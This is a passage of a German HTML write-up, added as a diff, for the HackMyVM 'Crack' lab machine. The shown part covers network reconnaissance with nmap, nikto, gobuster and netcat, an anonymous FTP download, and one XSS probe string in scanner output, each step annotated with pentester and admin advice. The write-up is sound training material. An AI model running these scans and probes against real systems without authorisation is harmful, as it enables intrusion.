@@ -1,0 +1,1621 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crack - HackMyVM - Easy - Vulnhub - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+ 
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Crack - HackMyVM - Easy - Vulnhub - Level: Easy - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <!-- Schwierigkeitsgrad-Überschrift und Kreis mit CSS-Klasse für Rot -->
+            <h2 class="easy-red">Easy</h2> <!-- Text: Easy, Farbe: Rot via CSS -->
+            <div class="circle easy-red">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Innere Farbe wird durch style.css oder die zusätzliche Regel oben gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">ll (ls -la alias)</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">telnet</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">touch</div>
+                <div class="tool-item">tr</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">uname</div>
+                <div class="tool-item">which</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">fg</div>
+                <div class="tool-item">reset</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">php (versucht)</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">sed</div>
+                <div class="tool-item">nano</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web/Service Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#poc">Proof of Concept (LFI)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <!-- Hier die Reconnaissance-Schritte einfügen, mit Kommentaren und Code-Blöcken -->
+            <p class="comment">Initial gestartet mit einem ARP-Scan, um aktive Hosts im lokalen Netzwerksegment zu identifizieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.116	08:00:27:92:df:1a	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `arp-scan -l` sendet ARP-Requests an alle möglichen Adressen im lokalen Netzwerk (-l steht für --localnet) und listet die antwortenden Hosts auf. Das Ergebnis zeigt einen Host mit der IP-Adresse 192.168.2.116 und der MAC-Adresse 08:00:27:92:df:1a. Der Hersteller der Netzwerkkarte (PCS Systemtechnik GmbH) ist oft ein Hinweis auf Virtualisierungssoftware (in diesem Fall typisch für VirtualBox).</p>
+            <p class="evaluation">**Bewertung:** Erfolgreiche Identifizierung eines potenziellen Ziels im Netzwerk. Die Information über den Hersteller ist ein erster, wenn auch kleiner, Hinweis auf die Art des Systems.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die gefundene IP-Adresse ist das primäre Ziel für weitere Scans. Notieren Sie sich die MAC-Adresse für eventuelle spätere Referenzen.
+            <br>**Empfehlung (Admin):** Netzwerksegmentierung und ARP-Spoofing-Schutz können die Effektivität solcher Scans einschränken. Überwachen Sie ARP-Anfragen im Netzwerk auf ungewöhnliche Aktivitäten.</p>
+
+            <p class="comment">Um die spätere Ansprache des Ziels zu vereinfachen, wird ein Eintrag in der lokalen `/etc/hosts`-Datei hinzugefügt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+127.0.1.1	cyber
+
+
+     #    192.168.2.114    hackmeplease.hmv
+     #    192.168.2.110    earth.local terratest.earth.local
+     #    192.168.2.123    vikings.vuln
+          192.168.2.116    crack.hmv
+     #    192.168.2.118	   deathnote.local deathnote.vuln
+     #    192.168.2.119    evilbox.local
+     #    192.168.2.120    doubletrouble.vuln localhost.com
+     #    192.168.2.122	   corrosion.vuln
+     #    192.168.2.124    nivek.vuln
+     #    192.168.2.125	   basic.vuln
+     #    192.168.2.126    keyring.vuln
+     #    192.168.2.127	   vulncms.vuln fsociety.web
+     #    192.168.2.128	   venus.vuln fsociety.web fsociety
+     #    192.168.2.129	   venom.vuln venom.box
+     #    192.168.2.131    android.vuln
+     #    192.168.2.132    momentum.vuln
+     #    192.168.2.133    thor.vuln
+     #    192.168.2.134	   cereal.vuln cereal.ctf secure.cereal.ctf
+     #    192.168.2.135    born2root.vuln
+     #    192.168.2.136    raix.vuln
+     #    192.168.2.137	   bsides.vuln
+     #    192.168.2.138    days.vuln</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `vi /etc/hosts` öffnet die Hosts-Datei im Texteditor `vi`. In dieser Datei werden IP-Adressen manuell Hostnamen zugeordnet. Hier wird der IP 192.168.2.116 der Name `crack.hmv` zugewiesen. Dies ermöglicht es, das Zielsystem fortan über den Namen `crack.hmv` statt der IP-Adresse anzusprechen.</p>
+            <p class="evaluation">**Bewertung:** Eine nützliche Convenience-Maßnahme, die die Lesbarkeit von Befehlen und die Organisation des Pentests verbessert. Sie hat keine direkte Auswirkung auf die Sicherheit des Zielsystems.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie immer Hostnamen in Ihren Befehlen, sobald sie definiert sind. Das erleichtert die Nachvollziehbarkeit und Anpassung, falls sich IP-Adressen ändern.
+            <br>**Empfehlung (Admin):** Dies ist eine rein clientseitige Konfiguration auf dem Rechner des Pentesters und erfordert keine Maßnahmen auf dem Server.</p>
+
+            <p class="comment">Ein schneller Nmap-Scan wird durchgeführt, um nur die offenen Ports zu identifizieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A 192.168.2.116 -p- | grep open</span></div>
+                    <pre>
+21/tcp    open  ftp      vsftpd 3.0.3
+4200/tcp  open  ssl/http ShellInABox
+12359/tcp open  unknown</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Dieser Nmap-Befehl führt einen TCP SYN Scan (`-sS`) über alle Ports (`-p-`) mit aggressiver Geschwindigkeit (`-T5`) durch. Zusätzlich werden Standard-Skripte (`-sC`), Versionserkennung (`-sV`) und Betriebssystemerkennung/Traceroute (`-A`) aktiviert. Die Ausgabe wird mittels `grep open` gefiltert, um nur die Zeilen anzuzeigen, die offene Ports enthalten. Drei offene Ports wurden identifiziert: 21 (FTP, vsftpd 3.0.3), 4200 (HTTPS, ShellInABox) und 12359 (unbekannter Dienst).</p>
+            <p class="evaluation">**Bewertung:** Sehr effizienter erster Scan, um einen schnellen Überblick über die offenen Dienste zu erhalten. Die identifizierten Dienste (FTP, ShellInABox, unbekannt) bilden die primären Angriffsvektoren.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Notieren Sie die offenen Ports und die erkannten Dienste/Versionen. Der unbekannte Dienst auf Port 12359 erfordert besondere Aufmerksamkeit.
+            <br>**Empfehlung (Admin):** Firewall-Regeln überprüfen. Ist es notwendig, dass diese Ports (insbesondere 12359) von außen erreichbar sind? Nicht benötigte Dienste sollten deaktiviert oder durch eine Firewall blockiert werden.</p>
+
+            <p class="comment">Ein detaillierter Nmap-Scan wird durchgeführt, um umfassende Informationen über die offenen Ports und Dienste zu sammeln.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A 192.168.2.116 -p-</span></div>
+                    <pre>
+Nmap scan report for crack.hmv (192.168.2.116)
+Host is up (0.00011s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT      STATE SERVICE  VERSION
+21/tcp    open  ftp      vsftpd 3.0.3
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ffff:192.168.2.137
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxrwxrwx    2 0        0            4096 Jun 07 14:40 upload [NSE: writeable]
+4200/tcp  open  ssl/http ShellInABox
+|_http-title: Shell In A Box
+| ssl-cert: Subject: commonName=crack
+| Not valid before: 2023-06-07T10:20:13
+|_Not valid after:  2043-06-02T10:20:13
+|_ssl-date: TLS randomness does not represent time
+12359/tcp open  unknown
+| fingerprint-strings:
+|   GenericLines:
+|     File to read:NFile to read:
+|   NULL:
+|_    File to read:
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port12359-TCP:V=7.93%I=7%D=6/20%Time=6491A4B3%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,D,"File\x20to\x20read:")%r(GenericLines,1C,"File\x20to\x20read:NFi
+SF:le\x20to\x20read:");
+MAC Address: 08:00:27:92:DF:1A (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Unix
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.11 ms crack.hmv (192.168.2.116)</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Die vollständige Ausgabe des Nmap-Scans bestätigt die offenen Ports 21, 4200 und 12359.
+            <ul>
+                <li>**Port 21 (FTP):** Läuft vsftpd 3.0.3. Das Skript `ftp-anon` meldet, dass anonymer FTP-Login erlaubt ist (`Anonymous FTP login allowed`). Wichtiger noch: Das Verzeichnis `upload` ist für den anonymen Benutzer beschreibbar (`[NSE: writeable]`). Das Skript `ftp-syst` liefert zusätzliche Statusinformationen über den Server.</li>
+                <li>**Port 4200 (HTTPS):** Läuft ShellInABox, eine webbasierte Terminalschnittstelle. Das SSL-Zertifikat ist selbstsigniert (`Subject: commonName=crack`) und hat eine lange Gültigkeitsdauer.</li>
+                <li>**Port 12359 (Unbekannt):** Nmap konnte den Dienst nicht eindeutig identifizieren, hat aber Daten empfangen. Die `fingerprint-strings` zeigen, dass der Dienst die Zeichenkette "File to read:" sendet. Dies deutet auf einen benutzerdefinierten Dienst hin, der möglicherweise Dateinamen erwartet.</li>
+            </ul>
+            Die Betriebssystemerkennung deutet auf ein Linux-System (Kernel 4.x oder 5.x) hin. Die MAC-Adresse bestätigt die Vermutung einer VirtualBox VM.</p>
+            <p class="evaluation">**Bewertung:** Hochkritisch. Der anonyme, beschreibbare FTP-Zugang ist eine erhebliche Schwachstelle. ShellInABox stellt eine Login-Schnittstelle dar, die potenziell für Brute-Force-Angriffe anfällig ist. Der unbekannte Dienst auf Port 12359 ist verdächtig und muss genauer untersucht werden – die empfangenen Strings ("File to read:") sind ein starker Hinweis auf seine Funktion.</p>
+            <p class="recommendation">**Empfehlung (Pentester):**
+            1. Untersuche den FTP-Server: Logge dich anonym ein, prüfe den Inhalt des `upload`-Verzeichnisses und teste die Schreibrechte.
+            2. Untersuche ShellInABox: Versuche Standard-Logins oder Brute-Force (falls erlaubt).
+            3. Untersuche Port 12359: Interagiere manuell mit dem Dienst (z.B. mit `nc` oder `telnet`), um seine Funktionsweise zu verstehen. Die Zeichenkette "File to read:" legt nahe, Dateipfade zu senden.
+            <br>**Empfehlung (Admin):**
+            1. **Dringend:** Deaktiviere den anonymen FTP-Zugang oder entferne zumindest die Schreibrechte für den anonymen Benutzer im `upload`-Verzeichnis.
+            2. Härte ShellInABox: Verwende starke Passwörter, implementiere eventuell 2FA oder beschränke den Zugriff auf bestimmte IP-Adressen.
+            3. Analysiere den Dienst auf Port 12359: Identifiziere den Prozess, der auf diesem Port lauscht. Wenn er nicht benötigt wird, deaktiviere ihn. Wenn er benötigt wird, stelle sicher, dass er sicher konfiguriert ist und keine Sicherheitslücken aufweist (z.B. Path Traversal, Command Injection).</p>
+
+            <p class="comment">Download aller Dateien vom FTP-Server via anonymem Login mithilfe von `wget`.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget -r ftp://anonymous:anonymous@192.168.2.116</span></div>
+                    <pre>
+--2023-06-20 15:12:14--  ftp://anonymous:password@192.168.2.116/
+           => 192.168.2.116/.listing
+Verbindungsaufbau zu 192.168.2.116:21 … verbunden.
+Anmelden als anonymous … Angemeldet!
+> SYST ... fertig.    > PWD ... fertig.
+> TYPE I ... fertig.  > CWD nicht notwendig.
+> PASV ... fertig.    > LIST ... fertig.
+
+192.168.2.116/.list     [ <=>                ]     183  --.-KB/s    in 0s
+
+2023-06-20 15:12:14 (76,4 MB/s) - 192.168.2.116/.listing gespeichert [183]
+
+192.168.2.116/.listing gelöscht.
+--2023-06-20 15:12:14--  ftp://anonymous:password@192.168.2.116/upload/
+           => 192.168.2.116/upload/.listing
+> CWD (1) /upload ... fertig.
+> PASV ... fertig.    > LIST ... fertig.
+
+192.168.2.116/uploa     [ <=>                ]     185  --.-KB/s    in 0s
+
+2023-06-20 15:12:14 (94,2 MB/s) - 192.168.2.116/upload/.listing gespeichert [185]
+
+192.168.2.116/upload/.listing gelöscht.
+--2023-06-20 15:12:14--  ftp://anonymous:password@192.168.2.116/upload/crack.py
+           => 192.168.2.116/upload/crack.py
+> CWD nicht erforderlich.
+> PASV ... fertig.    > RETR crack.py ... fertig.
+Länge: 849
+
+192.168.2.116/uploa 100%[&lt;=>                 ]     849  --.-KB/s    in 0s
+
+2023-06-20 15:12:14 (6,28 MB/s) - 192.168.2.116/upload/crack.py gespeichert [849]
+
+BEENDET --2023-06-20 15:12:14--
+Verstrichene Zeit: 0,008s
+Geholt: 1 Dateien, 849 in 0s (6,09 MB/s)</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `wget -r ftp://anonymous:anonymous@192.168.2.116` versucht, rekursiv (`-r`) alle Dateien vom FTP-Server unter der angegebenen Adresse herunterzuladen, wobei der Benutzername `anonymous` und das (beliebige, hier ebenfalls `anonymous` verwendete) Passwort `anonymous` benutzt werden. Die Ausgabe zeigt, dass `wget` sich erfolgreich anonym anmeldet und das Verzeichnis `/upload` findet. In diesem Verzeichnis wird die Datei `crack.py` (849 Bytes) entdeckt und heruntergeladen.</p>
+            <p class="evaluation">**Bewertung:** Dieser Schritt bestätigt den anonymen Lesezugriff auf den FTP-Server und liefert die Datei `crack.py`. Diese Datei ist potenziell sehr wertvoll, da sie Code enthalten könnte, der Schwachstellen aufweist oder Hinweise auf die Funktionsweise des Systems gibt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Analysiere den Inhalt der heruntergeladenen Datei `crack.py` sorgfältig. Suche nach hartcodierten Zugangsdaten, unsicherer Logik oder Hinweisen auf andere Dienste/Funktionen.
+            <br>**Empfehlung (Admin):** Überprüfe die Notwendigkeit der Datei `crack.py` auf dem FTP-Server. Falls sie nicht benötigt wird, entferne sie. Stelle sicher, dass keine sensiblen Informationen oder ausführbarer Code über anonymen FTP-Zugriff verfügbar sind.</p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web/Service Enumeration</h2>
+            <!-- Hier die Web Enumeration-Schritte einfügen, mit Kommentaren und Code-Blöcken -->
+             <p class="comment">Untersuchung des Webservers auf Port 4200 (ShellInABox) mit Nikto auf bekannte Schwachstellen und Fehlkonfigurationen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.116:4200</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.116
++ Target Hostname:    192.168.2.116
++ Target Port:        4200
+---------------------------------------------------------------------------
++ SSL Info:        Subject:  /CN=192.168.2.116
+                   Ciphers:  TLS_AES_256_GCM_SHA384
+                   Issuer:   /CN=192.168.2.116
++ Start Time:         2023-06-20 15:11:28 (GMT2)
+---------------------------------------------------------------------------
++ Server: No banner retrieved
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The site uses TLS and the Strict-Transport-Security HTTP header is not defined. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ All CGI directories 'found', use '-C none' to test none
++ /: The Content-Encoding header is set to "deflate" which may mean that the server is vulnerable to the BREACH attack. See: http://breachattack.com/
++ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS .
++ /guestbook/?number=5&lng=%3Cscript%3Ealert(document.domain);%3C/script%3E: MPM Guestbook 1.2 and previous are vulnreable to XSS attacks. See: OSVDB-2754</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Nikto scannt den Webserver auf Port 4200 (`-h 192.168.2.116:4200`). Da der Dienst über HTTPS läuft, analysiert Nikto auch das SSL-Zertifikat. Folgende Punkte wurden gemeldet:
+            <ul>
+                <li>Fehlende HTTP-Security-Header: `X-Frame-Options` (Schutz gegen Clickjacking), `Strict-Transport-Security` (HSTS - erzwingt HTTPS), `X-Content-Type-Options` (Schutz gegen MIME-Sniffing).</li>
+                <li>Potenzielle Anfälligkeit für den BREACH-Angriff aufgrund des `Content-Encoding: deflate` Headers.</li>
+                <li>Erlaubte HTTP-Methoden: GET, POST, OPTIONS.</li>
+                <li>Ein möglicher XSS (Cross-Site Scripting) Fund in einem Pfad `/guestbook/...`, der jedoch wahrscheinlich ein False Positive ist, da es sich um ShellInABox handelt und nicht um ein Gästebuch (MPM Guestbook). Nikto testet oft generische Pfade.</li>
+            </ul></p>
+            <p class="evaluation">**Bewertung:** Mittel. Die fehlenden Security-Header stellen Best-Practice-Verstöße dar und können die Sicherheit der Anwendung schwächen (z.B. Clickjacking). Die potenzielle BREACH-Anfälligkeit ist theoretischer Natur und schwer auszunutzen. Der XSS-Fund ist wahrscheinlich irrelevant für ShellInABox.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Notieren Sie die fehlenden Header als Findings. Der XSS-Fund kann ignoriert werden, es sei denn, weitere Enumeration bestätigt einen Pfad `/guestbook`. Konzentriere dich auf die Login-Funktionalität von ShellInABox.
+            <br>**Empfehlung (Admin):** Implementiere die fehlenden HTTP-Security-Header (`X-Frame-Options: DENY` oder `SAMEORIGIN`, `Strict-Transport-Security: max-age=31536000; includeSubDomains`, `X-Content-Type-Options: nosniff`) in der Webserver-Konfiguration für Port 4200, um die allgemeine Sicherheit zu erhöhen.</p>
+
+            <p class="comment">Versuch, Verzeichnisse und Dateien auf dem Webserver (Port 4200) mittels Gobuster zu finden, zunächst unter Verwendung des Hostnamens.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://crack.hmv:4200 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://crack.hmv:4200
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              ps1,py,dll,php,rar,db,asp,rtf,accdb,jpeg,jpg,csv,xlsx,html,raw,kdbx,txt,xls,sql,pl,gz,pub,bat,xml,tar,doc,aspx,pdf,bak,zip,mdb,sh,png,phtml,docx,exe
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2023/06/20 15:33:20 Starting gobuster in directory enumeration mode
+===============================================================
+
+Error: error on running gobuster: unable to connect to http://crack.hmv:4200/: Get "http://crack.hmv:4200/": EOF</pre>
+<!-- Hinweis: EOF steht für End-of-file. Dies deutet hier auf ein Problem bei der Verbindung hin, wahrscheinlich weil Gobuster HTTP statt HTTPS versucht hat. -->
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Gobuster wird im Verzeichnis-Modus (`dir`) gestartet, um die URL `http://crack.hmv:4200` zu scannen (`-u`). Es verwendet eine umfangreiche Liste von Dateiendungen (`-x`) und eine mittelgroße Wordlist (`-w`). Statuscodes 403 und 404 werden ignoriert (`-b '403,404'`), und es wird versucht, URLs auch ohne Slash am Ende zu finden (`-e`). Der Scan schlägt jedoch mit einem `unable to connect... EOF` Fehler fehl. Der Grund ist, dass Gobuster versucht, eine HTTP-Verbindung aufzubauen, der Dienst auf Port 4200 aber HTTPS erwartet (wie Nmap und Nikto zeigten).</p>
+            <p class="evaluation">**Bewertung:** Niedrig. Der Scan schlug aufgrund einer Fehlkonfiguration des Befehls fehl (HTTP statt HTTPS). Es wurden keine verwertbaren Ergebnisse erzielt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Wiederhole den Gobuster-Scan mit der korrekten URL, d.h. `https://crack.hmv:4200` oder `https://192.168.2.116:4200`. Füge außerdem die Option `-k` hinzu, um die Überprüfung des selbstsignierten SSL-Zertifikats zu überspringen.
+            <br>**Empfehlung (Admin):** Keine direkten Maßnahmen erforderlich, da der Scan fehlschlug. Die Verwendung von HTTPS ist korrekt.</p>
+
+            <p class="comment">Zweiter Versuch mit Gobuster auf Port 4200, diesmal unter Verwendung der IP-Adresse, aber immer noch mit HTTP.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.116:4200 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.116:4200
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              rar,mdb,jpg,html,csv,dll,bak,php,pub,accdb,exe,pl,png,xml,xls,sql,db,asp,docx,jpeg,xlsx,txt,zip,doc,ps1,sh,raw,rtf,kdbx,tar,aspx,gz,pdf,bat,py,phtml
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2023/06/20 15:33:29 Starting gobuster in directory enumeration mode
+===============================================================
+
+Error: error on running gobuster: unable to connect to http://192.168.2.116:4200/: Get "http://192.168.2.116:4200/": EOF</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Identischer Gobuster-Befehl wie zuvor, nur dass diesmal die IP-Adresse `192.168.2.116` statt des Hostnamens `crack.hmv` verwendet wird. Das Ergebnis ist dasselbe: Der Scan schlägt mit einem `EOF`-Fehler fehl, da weiterhin HTTP statt HTTPS verwendet wird.</p>
+            <p class="evaluation">**Bewertung:** Niedrig. Gleicher Fehler wie zuvor, keine Ergebnisse.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Siehe vorherige Empfehlung. Verwende `https://192.168.2.116:4200 -k`.
+            <br>**Empfehlung (Admin):** Keine Maßnahmen erforderlich.</p>
+
+            <p class="comment">Versuch, Verzeichnisse auf dem unbekannten Dienst auf Port 12359 mit Gobuster zu finden (HTTP).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://crack.hmv:12359 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                    <pre>
+<!-- Es fehlt die Ausgabe von Gobuster hier, wahrscheinlich wurde der Prozess abgebrochen oder lieferte keine verwertbare Ausgabe -->
+gobuster
+<!-- Diese einzelne Zeile "gobuster" deutet darauf hin, dass der Befehl möglicherweise nicht korrekt ausgeführt wurde oder sofort beendet wurde. -->
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Erneuter Gobuster-Versuch, diesmal gegen den unbekannten Dienst auf Port 12359 unter der Annahme, es könnte sich um einen HTTP-basierten Dienst handeln. Die Ausgabe ist unvollständig und deutet darauf hin, dass der Scan entweder fehlschlug, keine Ergebnisse lieferte oder manuell abgebrochen wurde. Da der Nmap-Scan zeigte, dass dieser Port nicht auf HTTP reagiert, ist ein Fehlschlag wahrscheinlich.</p>
+            <p class="evaluation">**Bewertung:** Niedrig. Der Versuch, Gobuster auf einem Nicht-HTTP-Port zu verwenden, ist nicht zielführend. Keine Ergebnisse.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Verwende für die Interaktion mit dem Dienst auf Port 12359 Werkzeuge wie `nc` oder `telnet`, basierend auf den Hinweisen aus dem Nmap-Scan ("File to read:"). Directory Busting ist hier unangebracht.
+            <br>**Empfehlung (Admin):** Keine Maßnahmen erforderlich.</p>
+
+            <p class="comment">Manuelle Prüfung der Erreichbarkeit von Port 4200 mit Netcat.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/media/sf_15._Gemeinsam/wordlists]
+└─# <span class="command">nc -vv 192.168.2.116 4200</span></div>
+                    <pre>
+crack.hmv [192.168.2.116] 4200 (?) open
+^C sent 0, rcvd 0</pre>
+<!-- ^C deutet auf manuellen Abbruch hin -->
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `nc -vv 192.168.2.116 4200` versucht, eine TCP-Verbindung zum Ziel auf Port 4200 herzustellen und gibt dabei ausführliche Meldungen aus (`-vv`). Die Ausgabe `open` bestätigt, dass der Port offen ist und eine Verbindung aufgebaut werden konnte. Die Verbindung wurde danach manuell mit Strg+C (`^C`) beendet.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt die Erreichbarkeit des Ports, liefert aber keine neuen Informationen über den Dienst selbst.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Dies bestätigt die Ergebnisse des Nmap-Scans. Die weitere Interaktion sollte über einen Browser (HTTPS) oder spezialisierte Tools erfolgen.
+            <br>**Empfehlung (Admin):** Keine Maßnahmen erforderlich.</p>
+
+             <p class="comment">Manuelle Prüfung der Erreichbarkeit von Port 12359 mit Netcat.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/media/sf_15._Gemeinsam/wordlists]
+└─# <span class="command">nc -vv 192.168.2.116 12359</span></div>
+                    <pre>
+crack.hmv [192.168.2.116] 12359 (?) open
+^C sent 0, rcvd 0</pre>
+<!-- ^C deutet auf manuellen Abbruch hin -->
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Analog zum vorherigen Schritt wird mit `nc -vv 192.168.2.116 12359` die Verbindung zu Port 12359 getestet. Auch hier bestätigt `open`, dass der Port erreichbar ist. Die Verbindung wurde ebenfalls manuell beendet (`^C`). Es wurde kein Versuch unternommen, Daten zu senden (z.B. einen Dateinamen), wie vom Nmap-Scan suggeriert.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt die Erreichbarkeit des unbekannten Dienstes.</p>
